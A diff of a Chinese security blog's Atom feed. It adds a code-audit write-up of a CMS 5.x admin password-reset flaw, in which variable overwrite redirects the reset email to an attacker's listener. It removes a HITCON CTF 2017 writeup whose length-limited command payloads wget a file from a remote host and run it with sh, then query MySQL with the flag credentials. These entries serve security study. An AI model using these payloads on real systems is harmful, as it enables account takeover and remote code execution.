@@ -303,6 +303,59 @@
   </entry>
   
   <entry>
+    <title>某CMS 5.X版本 管理员密码重置漏洞</title>
+    <link href="http://chybeta.github.io/2018/03/05/%E6%9F%90CMS-5-X%E7%89%88%E6%9C%AC-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://chybeta.github.io/2018/03/05/某CMS-5-X版本-管理员密码重置漏洞/</id>
+    <published>2018-03-05T08:44:55.000Z</published>
+    <updated>2018-03-06T08:47:36.133Z</updated>
+    
+    <content type="html"><![CDATA[<p>某CMS 5.X版本 管理员密码重置漏洞</p>
+<a id="more"></a>
+<p>首发于: <a href="https://xianzhi.aliyun.com/forum/topic/2097" target="_blank" rel="external">某CMS 5.X版本 管理员密码重置漏洞</a></p>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>蹭一下<a href="https://xianzhi.aliyun.com/forum/topic/2096" target="_blank" rel="external">某CMS 5.X版本GETSHELL漏洞合集</a>的热点。</p>
+<h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h1><p>在 admin/admin/getpassword.php 中包含了 admin/include/common.inc.php 。跟入common.inc.php，第77行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</div><div class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</div><div class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">		$_M[<span class="string">'form'</span>][$_key]=daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里存在变量覆盖漏洞。</p>
+<p>回到 admin/admin/getpassword.php ，从第 94 行开始是发送重置密码链接邮箱的处理过程：</p>
+<ol>
+<li>从数据库中取出管理员的信息</li>
+<li>生成密码重置链接</li>
+<li>发送密码重置链接</li>
+</ol>
+<p>在发送阶段，admin/admin/getpassword.php 第 143 行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require_once</span> ROOTPATH.<span class="string">'include/jmail.php'</span>;</div><div class="line">$sendMail=jmailsend($from,$fromname,$to,$title,$body,$usename,$usepassword,$smtp);</div><div class="line"><span class="keyword">if</span>($sendMail==<span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">require_once</span> ROOTPATH.<span class="string">'include/export.func.php'</span>;</div><div class="line">	$post=<span class="keyword">array</span>(<span class="string">'to'</span>=&gt;$to,<span class="string">'title'</span>=&gt;$title,<span class="string">'body'</span>=&gt;$body);</div><div class="line">	$met_file=<span class="string">'/passwordmail.php'</span>;</div><div class="line">	$sendMail=curl_post($post,<span class="number">30</span>);</div><div class="line">	<span class="keyword">if</span>($sendMail==<span class="string">'nohost'</span>)$sendMail=<span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>先来看看当<code>$sendMail==0</code>时的情况，此时会将所需信息整合为变量<code>$post</code>，之后调用<code>curl_post</code>发送。<code>curl_post</code>定义在 include/export.func.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl_post</span><span class="params">($post,$timeout)</span></span>&#123;</div><div class="line"><span class="keyword">global</span> $met_weburl,$met_host,$met_file;</div><div class="line">$host=$met_host;</div><div class="line">$file=$met_file;</div><div class="line">	<span class="keyword">if</span>(get_extension_funcs(<span class="string">'curl'</span>)&amp;&amp;function_exists(<span class="string">'curl_init'</span>)&amp;&amp;function_exists(<span class="string">'curl_setopt'</span>)&amp;&amp;function_exists(<span class="string">'curl_exec'</span>)&amp;&amp;function_exists(<span class="string">'curl_close'</span>))&#123;</div><div class="line">		$curlHandle=curl_init(); </div><div class="line">		curl_setopt($curlHandle,CURLOPT_URL,<span class="string">'http://'</span>.$host.$file); </div><div class="line">		curl_setopt($curlHandle,CURLOPT_REFERER,$met_weburl);</div><div class="line">		....</div><div class="line">		$result=curl_exec($curlHandle); </div><div class="line">		curl_close($curlHandle); </div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">if</span>(function_exists(<span class="string">'fsockopen'</span>)||function_exists(<span class="string">'pfsockopen'</span>))&#123;</div><div class="line">			$post_data=$post;</div><div class="line">			$post=<span class="string">''</span>;</div><div class="line">			@ini_set(<span class="string">"default_socket_timeout"</span>,$timeout);</div><div class="line">			<span class="keyword">while</span> (<span class="keyword">list</span>($k,$v) = each($post_data)) &#123;</div><div class="line">				$post .= rawurlencode($k).<span class="string">"="</span>.rawurlencode($v).<span class="string">"&amp;"</span>;</div><div class="line">			&#125;</div><div class="line">			$post = substr( $post , <span class="number">0</span> , <span class="number">-1</span> );</div><div class="line">			$len = strlen($post);</div><div class="line">			<span class="keyword">if</span>(function_exists(fsockopen))&#123;</div><div class="line">				$fp = @fsockopen($host,<span class="number">80</span>,$errno,$errstr,$timeout);</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span>&#123;</div><div class="line">				$fp = @pfsockopen($host,<span class="number">80</span>,$errno,$errstr,$timeout);</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">if</span> (!$fp) &#123;</div><div class="line">				$result=<span class="string">''</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span> &#123;</div><div class="line">				$result = <span class="string">''</span>;</div><div class="line">				$out = <span class="string">"POST $file HTTP/1.0\r\n"</span>;</div><div class="line">				$out .= <span class="string">"Host: $host\r\n"</span>;</div><div class="line">				$out .= <span class="string">"Referer: $met_weburl\r\n"</span>;</div><div class="line">				$out .= <span class="string">"Content-type: application/x-www-form-urlencoded\r\n"</span>;</div><div class="line">				$out .= <span class="string">"Connection: Close\r\n"</span>;</div><div class="line">				$out .= <span class="string">"Content-Length: $len\r\n"</span>;</div><div class="line">				$out .=<span class="string">"\r\n"</span>;</div><div class="line">				$out .= $post.<span class="string">"\r\n"</span>;</div><div class="line">				fwrite($fp, $out);</div></pre></td></tr></table></figure></p>
+<p>可以看到这里的<code>$met_host</code>操控了邮件内容的发送地点，而该参数可以利用前面的变量覆盖漏洞来进行直接的控制。</p>
+<p>接着考虑如何让<code>$sendMail==0</code>。跟入<code>jmailsend</code>，include/jmail.php 第7行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">jmailsend</span><span class="params">($from,$fromname,$to,$title,$body,$usename,$usepassword,$smtp,$repto,$repname)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">global</span> $met_fd_port,$met_fd_way;</div><div class="line">	...</div><div class="line">	<span class="keyword">if</span>(stripos($smtp,<span class="string">'.gmail.com'</span>)===<span class="keyword">false</span>)&#123;</div><div class="line">		$mail-&gt;Port       = $met_fd_port;</div><div class="line">		...</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		$mail-&gt;Port       = <span class="number">465</span>;</div><div class="line">		...</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	...</div><div class="line">	</div><div class="line">	<span class="keyword">if</span>(!$mail-&gt;Send()) &#123;</div><div class="line">		$mail-&gt;SmtpClose();</div><div class="line">		<span class="comment">//return "Mailer Error: " . $mail-&gt;ErrorInfo;</span></div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$mail-&gt;SmtpClose();</div><div class="line">		<span class="comment">//return "Message sent!";</span></div><div class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>met_fd_port</code>指定了邮件发送端口，属于系统配置。因此倘若我们利用前面的变量覆盖漏洞修改端口，即可导致邮件发送失败，进入到<code>curl_post</code>。</p>
+<h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>因为使用<code>curl_post</code>中使用的是http协议，默认端口为80。因此在vps上监听80端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvv 80</div></pre></td></tr></table></figure></p>
+<p>在填入管理员密码或邮箱后，抓包修改数据：</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180305090307-f745655c-2010-1.png" alt="1.png"></p>
+<p>forward掉后，<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180305090302-f422d648-2010-1.png" alt="2.png"></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180305090229-e0c056ac-2010-1.png" alt="3.png"></p>
+<h1 id="0x03-漏洞补丁"><a href="#0x03-漏洞补丁" class="headerlink" title="0x03 漏洞补丁"></a>0x03 漏洞补丁</h1><p>在6.0版本中，官方直接删除了该文件，简单粗暴。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;某CMS 5.X版本 管理员密码重置漏洞&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="metinfo" scheme="http://chybeta.github.io/tags/metinfo/"/>
+    
+      <category term="逻辑漏洞" scheme="http://chybeta.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="密码重置" scheme="http://chybeta.github.io/tags/%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
+    
+  </entry>
+  
+  <entry>
     <title>某CMS V5.7 SP2 后台Getshell</title>
     <link href="http://chybeta.github.io/2018/02/27/%E6%9F%90CMS-V5-7-SP2-%E5%90%8E%E5%8F%B0Getshell/"/>
     <id>http://chybeta.github.io/2018/02/27/某CMS-V5-7-SP2-后台Getshell/</id>
@@ -1395,75 +1448,6 @@ $output .= &quot;if ({$dec}) {\n&quot;;
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
       <category term="php文件包含" scheme="http://chybeta.github.io/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HITCON CTF 2017-BabyFirst Revenge-writeup</title>
-    <link href="http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/"/>
-    <id>http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/</id>
-    <published>2017-11-04T15:32:08.000Z</published>
-    <updated>2017-11-06T07:28:44.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>HITCON CTF 2017-BabyFirst Revenge-writeup<br><a id="more"></a></p>
-<h1 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Do you remember BabyFirst from HITCON CTF 2015?</div><div class="line">This is the harder version!</div><div class="line">http://52.199.204.34/</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>点开后，发现给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">   $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">   @mkdir($sandbox);</div><div class="line">   @chdir($sandbox);</div><div class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</div><div class="line">	   @exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</div><div class="line">	   @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</div><div class="line">   &#125;</div><div class="line">   highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure></p>
-<p>简要的分析一下：</p>
-<ol>
-<li>对每个REMOTE_ADDR有对应的sandbox</li>
-<li>能执行长度&lt;=5的命令</li>
-<li>提供了reset功能。</li>
-</ol>
-<p>之前在总结时，有遇到过，见<a href="https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html" target="_blank" rel="external">chybeta:wafbypass</a>，github地址为：<a href="https://github.com/CHYbeta/WAF-Bypass" target="_blank" rel="external">https://github.com/CHYbeta/WAF-Bypass</a></p>
-<p>原本的长度为8，而这里为5，条件苛刻了许多。在原本的场景中，我们可以通过构造文件名，之后利用ls命令及其参数将所需的shell命令写入到一个新文件中，并sh执行该新文件从而达到任意命令执行。这里同样可以借鉴其思路。关键点有两个：</p>
-<ol>
-<li>长度限制</li>
-<li>写入的顺序</li>
-</ol>
-<p>这里先补充一些基本的知识。在linux中，倘若命令过长，可以用续行符（<code>\</code>）来将一行命令变为多行来写。具体例子如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat chybeta</div><div class="line"><span class="built_in">echo</span>\</div><div class="line"> <span class="string">"chy\</span></div><div class="line">beta"</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ sh chybeta</div><div class="line">chybeta</div></pre></td></tr></table></figure></p>
-<p>在文件chybeta中，通过<code>\</code>将命令<code>echo &quot;chybeta&quot;</code>分成了三个部分。</p>
-<p>倘若有一行出错呢？见下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat chybeta</div><div class="line">atebyhc</div><div class="line"><span class="built_in">echo</span>\</div><div class="line"> <span class="string">"chy\</span></div><div class="line">beta"</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ sh chybeta</div><div class="line">chybeta: 1: chybeta: atebyhc: not found</div><div class="line">chybeta</div></pre></td></tr></table></figure></p>
-<p>在最前我加了一句<code>atebyhc</code>，显然这不是命令，但这并不妨碍之后语句的执行，仍然能在<code>\</code>的作用下打印出<code>chybeta</code>。</p>
-<p>接下来考虑如何构造文件。由于长度的限制，我们不能通过直接的<code>ls -t</code>来通过时间来进行文件名排序并构造。但我们可以曲线救国，先想办法把<code>ls -t&gt;q</code>写入到某个文件中，假设为文件a，然后sh执行文件a，这样命令<code>ls -t</code>的结果就能输出到文件q中。</p>
-<p>我最后形成的payload1如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;-t\</div><div class="line">&gt;\&gt;q</div><div class="line">&gt;l\</div><div class="line">&gt;s\ \</div><div class="line">ls&gt;a</div><div class="line">ls&gt;&gt;a</div></pre></td></tr></table></figure></p>
-<p>这里详细解释。在默认情况下，命令ls，根据名称排序，空格等最前，数字其次，字母最后。当我们执行了前四条语句后，这时文件夹中情况如下(这是我本地环境)：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/2.png?raw=true" alt=""></p>
-<p>接着执行<code>ls&gt;a</code>后，a中文件内容：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/3.png?raw=true" alt=""></p>
-<p>紧接着执行<code>ls&gt;&gt;a</code>，这个命令会将<code>ls</code>的结果追加到文件a中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/4.png?raw=true" alt=""></p>
-<p>其文本内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div></pre></td></tr></table></figure></p>
-<p>由前面所述，错误的命令不会影响后面正确语句的正确执行，所以第一行到第三行是错误的命令可忽略，并且第三行<code>a</code>后没有续行符，这不会影响到下一行。从第四行到第七行，由于续行符（<code>\</code>），可以构成如下的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div></pre></td></tr></table></figure></p>
-<p>也即<code>ls -t&gt;q</code>，能够根据文件的时间来进行排序并将结果写入到文件q中。剩余几行，对结果无影响可忽略。</p>
-<p>接下来延续以前的套路，想办法wget远程的某个文件，这样文件中能藏有足够长的payload。为方便起见-，可以将远程服务器的ip转换为十进制，这样不用考虑小数点带来的影响。假设我们的ip转换成十进制后为：2077173*48（hh这里我隐去一位数字）。则命令<code>wget 2077173*48</code>，会从<code>2077173*48</code>处下载并默认保存为index.html。考虑到长度的限制，我们需要将上述命令分段成长度小于等于5，并用续行符<code>\</code>隔开。考虑到，前面是使用<code>ls -t&gt;q</code>，而参数<code>-t</code>，会让新生成的文件排在前面，越早生成的文件排在后面。所以构造这一部分的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;*48</div><div class="line">&gt;173\</div><div class="line">&gt;077\</div><div class="line">&gt;\ 2\</div><div class="line">&gt;et\</div><div class="line">&gt;wg\</div></pre></td></tr></table></figure></p>
-<p>此时文件目录为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/5.png?raw=true" alt=""></p>
-<p>接着执行命令<code>sh a</code>，注意文件a是我们第一阶段时生成的，其中包含命令<code>ls -t&gt;q</code>。运行完后查看新生成的文件q：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/6.png?raw=true" alt=""></p>
-<p>如前所述，这里构成了一个新的命令<code>wget 2077173*48</code>。注意在<code>*48</code>的下一行是文件<code>a</code>的名字，由于它后面没有<code>\</code>，并且字母顺序在<code>s\</code>之前，刚好起了一个分割的作用。</p>
-<p>接下来执行命令<code>sh q</code>，这里为演示方便在本地shell中操作，这跟访问<code>?cmd=sh%20a</code>的效果是一样的:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/7.png?raw=true" alt=""></p>
-<p>可以发现成功的下载了远程的文件并保存到index.html中，而index.html是存放在我们自己的服务器上的，只要执行<code>sh%20i*</code>，注意这里用来通配符<code>*</code>，就能够执行<code>sh index.html</code>，从而执行其中的命令。</p>
-<p>接下来，需要不断的进行探索flag的所在地。可以按照下述命令来实现命令的执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?cmd=rm%20i*   // 删除index.html</div><div class="line">?cmd=sh%20a    // 执行文件q，即wget新的index.html</div><div class="line">?cmd=sh%20i*   // 执行index.html中的shell命令</div></pre></td></tr></table></figure></p>
-<p>在经过一番摸索后，发现在home目录的某个用户的主目录下有README.txt，其内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Flag is in the MySQL database</div><div class="line">fl4444g / SugZXUtgeJ52_Bvr</div></pre></td></tr></table></figure></p>
-<p>接下去通过替换index.html的内容。</p>
-<p>index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;show databases;&quot; &gt; kk5</div></pre></td></tr></table></figure></p>
-<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk5，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk5，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Database</div><div class="line">information_schema</div><div class="line">fl4gdb</div></pre></td></tr></table></figure></p>
-<p>index.html:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x666c34676462&quot; &gt; kk7</div></pre></td></tr></table></figure></p>
-<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk7，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk7，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GROUP_CONCAT(table_name)</div><div class="line">this_is_the_fl4g</div></pre></td></tr></table></figure></p>
-<p>index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;(SELECT * FROM fl4gdb.this_is_the_fl4g&quot; &gt;　kk9</div></pre></td></tr></table></figure></p>
-<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk9，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk9，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secret</div><div class="line">hitcon&#123;idea_from_phith0n,thank_you:)&#125;</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/8.png?raw=true" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;HITCON CTF 2017-BabyFirst Revenge-writeup&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
   </entry>
   
